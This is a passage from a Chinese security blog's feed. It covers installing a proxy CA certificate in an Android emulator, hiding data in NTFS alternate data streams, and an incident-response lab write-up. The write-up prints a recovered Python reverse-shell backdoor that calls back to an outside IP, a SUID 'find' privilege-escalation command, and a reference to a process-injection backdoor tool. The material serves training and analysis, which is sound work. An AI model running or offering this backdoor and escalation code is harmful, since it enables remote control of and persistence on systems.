href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/06.%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%90%84%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%8A%93%E5%8C%85/">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/06.%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%90%84%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%8A%93%E5%8C%85/</a></p><blockquote><p>但是Android 从 7.0 开始，系统不再信任用户 CA 证书，安装证书的方式就麻烦一点</p></blockquote><p>首先访问burp的监听地址下载证书</p><p><img src="https://cdn.clown2024.cn/202408151927057.png" alt="image-20240815192723003"></p><p>打开文件管理器可以看到证书</p><p><img src="https://cdn.clown2024.cn/202408151928262.png" alt="image-20240815192845208"></p><p>然后用kali里的工具openssl计算证书哈希值</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">openssl x509 -inform der -subject_hash_old -<span class="hljs-keyword">in</span> cacert.der -noout<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408151939380.png" alt="image-20240815193917347"></p><p>将证书名改为<code>&lt;hash&gt;.0</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> cacert.der 9a5ba575.0<br></code></pre></td></tr></table></figure><p>然后用<code>MT管理器</code>将其移动到<code>/system/etc/security/cacerts/</code>目录</p><blockquote><p>雷电9这里会出现挂载失败无法移动的情况</p><p><img src="https://cdn.clown2024.cn/202408151952697.png" alt="image-20240815195250615"></p><p>要在设置–&gt;性能设置修改一下vmdk可写</p><p><img src="https://cdn.clown2024.cn/202408151954575.png" alt="image-20240815195457525"></p></blockquote><p>难绷的还是不行，换网易的MuMu模拟器就好了，这雷电模拟器什么毛病🥲</p><p>流程和上面一样，参考文章：<a href="https://blog.csdn.net/shr592833253/article/details/139395912">用手机模拟器进行APP渗透测试抓包(超详细版)_手机模拟器抓包-CSDN博客</a></p><p>证书放过去的时候要记得有足够权限，有些可能不够，可以直接用mt改</p><p><img src="https://cdn.clown2024.cn/202408152317058.png" alt="image-20240815231730970"></p><p>然后把&#x2F;system这个目录的权限也改成777</p><p><img src="https://cdn.clown2024.cn/202408152319326.png" alt="image-20240815231905270"></p><p>然后就可以正常抓包也没有证书问题了</p><p><img src="https://cdn.clown2024.cn/202408152321450.png" alt="image-20240815232138363"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;模拟器代理设置&quot;&gt;&lt;a href=&quot;#模拟器代理设置&quot; class=&quot;headerlink&quot; title=&quot;模拟器代理设置&quot;&gt;&lt;/a&gt;模拟器代理设置&lt;/h1&gt;&lt;p&gt;这里用雷电模拟器&lt;/p&gt;
&lt;p&gt;ipconfig查看一下本机的IP&lt;/p&gt;
&lt;p&gt;&lt;img src=</summary>
      
    
    
    
    <category term="app渗透" scheme="https://clowsman.github.io/categories/app%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透" scheme="https://clowsman.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>NTFS数据流隐写</title>
    <link href="https://clowsman.github.io/2024/07/12/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/"/>
    <id>https://clowsman.github.io/2024/07/12/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/</id>
    <published>2024-07-12T12:39:30.000Z</published>
    <updated>2024-07-15T06:42:10.915Z</updated>
    
    <content type="html"><![CDATA[<p>这是在前文学习mysql提权的时候遇到的利用数据流写文件，以前有点印象但不是很深，这里记录一下。</p><h1 id="ntfs数据流介绍"><a href="#NTFS数据流介绍" class="headerlink" title="NTFS数据流介绍"></a>NTFS数据流介绍</h1><p>在NTFS文件系统中存在着NTFS备用数据流（Alternate Data Streams，简称ADS），这是NTFS磁盘格式的特性之一。每一个文件，都有着主文件流和非主文件流，主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是NTFS备用数据流。</p><p>ADS的作用在于，它允许一个文件携带着附加的信息。例如，IE浏览器下载文件时，会向文件添加一个数据流，标记该文件来源于外部，即带有风险，那么，在用户打开文件时，就会弹出文件警告提示。再如，在网址收藏中，也会附加一个favicon数据流以存放网站图标。</p><p>ADS也被用于一些恶意文件隐藏自身,作为后门。</p><h1 id="ads应用"><a href="#ADS应用" class="headerlink" title="ADS应用"></a>ADS应用</h1><p>这里写一个隐藏文本来看看，首先创建一个空的example.txt，然后写入ADS，这里写入一个字符串</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;123&quot;</span> &gt; example.txt:config <span class="hljs-comment">#这里要用cmd，用powershell会报错</span><br></code></pre></td></tr></table></figure><p>然后直接打开文件还是空的</p><p><img src="http://cdn.clown2024.cn/202407151442538.png" alt="image-20240713015237491"></p><p>想要查看ADS的话可以这样</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">notepad example.txt:config<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151442539.png" alt="image-20240713015437701"></p><p>还有用下面命令查看该文件所有的ADS</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> example.txt /R<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151442540.png" alt="image-20240713015550479"></p><p>ADS可以写任何东西，包括图片、音频、视频等，所以可以用来隐藏后门，在Windows XP中，可执行文件可以隐藏并且被执行。但是，微软已经发现了这个问题并进行了修复，目前在Windows Vista及后续系统中已经无法直接运行ADS中的可执行文件了。</p><p>可以直接这样写入文件，其他文件同理</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">type</span> <span class="hljs-number">01</span>.txt &gt; example.txt:<span class="hljs-number">01</span>.txt<br><span class="hljs-built_in">type</span> <span class="hljs-number">01</span>.txt &gt;&gt; example.txt:<span class="hljs-number">01</span>.txt<br></code></pre></td></tr></table></figure><p>ADS数据流文件有三种删除方式。一是直接<strong>删除宿主</strong>文件，二是将宿主文件<strong>移到</strong>FAT32<strong>等非</strong>NTFS<strong>分区中</strong>；三是利用<strong>工具软件</strong>，如IceSword、Ntfs Streams Editor删除。</p><p>Ntfs Streams Editor删除命令如下：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">streams.exe -d &lt;File&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这是在前文学习mysql提权的时候遇到的利用数据流写文件，以前有点印象但不是很深，这里记录一下。&lt;/p&gt;
&lt;h1 id=&quot;ntfs数据流介绍&quot;&gt;&lt;a href=&quot;#NTFS数据流介绍&quot; class=&quot;headerlink&quot; title=&quot;NTFS数据流介绍&quot;&gt;&lt;/a&gt;NTF</summary>
      
    
    
    
    <category term="杂七杂八" scheme="https://clowsman.github.io/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
    <category term="杂七杂八" scheme="https://clowsman.github.io/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
  </entry>
  
  <entry>
    <title>玄机应急响应靶场-第三章</title>
    <link href="https://clowsman.github.io/2024/07/12/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/"/>
    <id>https://clowsman.github.io/2024/07/12/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/</id>
    <published>2024-07-12T07:53:07.000Z</published>
    <updated>2024-07-15T06:53:06.252Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h1><p>靶机简介</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ssh root@env.xj.edisec.net -p  密码  xjqxwcyc<br>1.黑客隐藏的隐藏的文件 完整路径md5<br>2.黑客隐藏的文件反弹shell的ip+端口 &#123;ip:port&#125;<br>3.黑客提权所用的命令 完整路径的md5 flag&#123;md5&#125; <br>4.黑客尝试注入恶意代码的工具完整路径md5<br>5.使用命令运行 ./x.xx 执行该文件  将查询的 Exec****** 值 作为flag提交 flag&#123;/xxx/xxx/xxx&#125;<br></code></pre></td></tr></table></figure><p>这里看了一下web目录没什么东西，直接用D盾全盘查杀一下</p><blockquote><p>这里挂载要指定端口，指定端口的形式是这样的：\sshfs.r\username@remote_ip!port\</p></blockquote><p>emmm但是卡住了扫不出来东西</p><p><img src="http://cdn.clown2024.cn/202407151452447.png" alt="image-20240712163333073"></p><p>最后是在&#x2F;tmp目录下发现了一个隐藏文件，里面有python脚本&#x2F;tmp&#x2F;.temp&#x2F;libprocesshider&#x2F;1.py</p><p><img src="http://cdn.clown2024.cn/202407151452448.png" alt="image-20240712162238473"></p><p>flag{109ccb5768c70638e24fb46ee7957e37}</p><p>其脚本内容</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> socket,subprocess,os,sys, time<br><br>pidrg = os.fork()<br><span class="hljs-keyword">if</span> pidrg &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br>os.chdir(<span class="hljs-string">&quot;/&quot;</span>)<br>os.setsid()<br>os.umask(<span class="hljs-number">0</span>)<br>drgpid = os.fork()<br><span class="hljs-keyword">if</span> drgpid &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">try</span>:<br>                sys.stdout.flush()<br>                sys.stderr.flush()<br>                fdreg = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>                sys.stdout = fdreg<br>                sys.stderr = fdreg<br>                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>                sdregs.connect((<span class="hljs-string">&quot;114.114.114.121&quot;</span>,<span class="hljs-number">9999</span>))<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">0</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">1</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">2</span>)<br>                p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br>                sdregs.close()<br>        <span class="hljs-keyword">except</span> Exception:<br>                <span class="hljs-keyword">pass</span><br>        time.sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>其反弹shell的ip和端口就是上面代码中的</p><p>flag{114.114.114.121:9999}</p><blockquote><p>一开始找到一个1.sh的脚本，里面是一个bash反弹shell但是那个玩意不是flag，不知道是不是环境没怎么改。。。</p></blockquote><p>查看黑客的提权命令，先看&#x2F;etc&#x2F;passwd</p><p><img src="http://cdn.clown2024.cn/202407151452449.png" alt="image-20240712162658912"></p><p>有个ctf用户，切换到该用户执行下面命令找是否能够suid提权</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452450.png" alt="image-20240712162931598"></p><p>发现find命令就能提权</p><p>其提权命令如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/usr/bin/find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br></code></pre></td></tr></table></figure><p>flag{7fd5884f493f4aaf96abee286ee04120}</p><blockquote><p>emmm没想明白这个思路是怎么来的，看别人的wp，难道提权一定是suid吗😥</p></blockquote><p>然后就是找注入代码的恶意工具，这里用下面这个命令查找</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;.*&#x27;</span> 2&gt;/dev/null|grep -v <span class="hljs-string">&#x27;sys&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452451.png" alt="image-20240712164100081"></p><p>搜索可以知道这是一个注入工具：<a href="https://cn-sec.com/archives/2563485.html">https://cn-sec.com/archives/2563485.html</a></p><blockquote><p>Cymothoa是一款隐秘的后门工具，通过向目标主机上活跃的进程注入恶意代码来执行后门工作，这也反向说明了，实际上Cymothoa后门会拥有和原进程相同的权限，且Cymothoa是通过向系统进程注入shellcode去执行后门，所以不会像以前写过的许多后门一样创建自己的进程，这使得它的隐蔽性提高了很多。</p></blockquote><p>所以其工具路径如下：&#x2F;opt&#x2F;.cymothoa-1-beta&#x2F;cymothoa</p><p>flag{087c267368ece4fcf422ff733b51aed9}</p><p>最后执行一下这个1.py的脚本查询一下网络连接</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python3 ./1.py<br>netstat -pantu<br><span class="hljs-built_in">cat</span> /proc/563/cmdline<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452452.png" alt="image-20240712165626986"></p><p>然后找到一个软链接，这个就是flag(没懂跟题目描述的步骤有什么关系</p><p>flag{&#x2F;usr&#x2F;bin&#x2F;python3.4}</p><blockquote><p>说实话是在没看懂这里是什么意思，看的别人的wp，有点意义不明。。。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;linux权限维持&quot;&gt;&lt;a href=&quot;#Linux权限维持&quot; class=&quot;headerlink&quot; title=&quot;Linux权限维持&quot;&gt;&lt;/a&gt;Linux权限维持&lt;/h1&gt;&lt;p&gt;靶机简介&lt;/p&gt;
&lt;figure class=&quot;highlight plaintex</summary>
      
    
    
    
    <category term="应急响应" scheme="https://clowsman.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://clowsman.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
</feed>
